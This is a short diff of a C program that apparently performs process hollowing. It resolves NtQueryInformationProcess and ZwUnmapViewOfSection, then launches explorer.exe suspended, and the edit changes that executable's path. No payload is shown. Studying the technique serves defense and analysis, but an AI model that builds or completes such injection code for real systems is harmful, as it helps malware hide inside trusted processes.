@@ -24,7 +24,7 @@ int main()
 	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
 	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)fpZwUnmapViewOfSection;
 
-	if (!CreateProcess("C:\\Windows\\explorer.exe", NULL, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
+	if (!CreateProcess("C:\\Windows\\System32\\explorer.exe", NULL, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
 	{
 		printf("CreateProcess Failed: %i.\n", GetLastError());
 	}
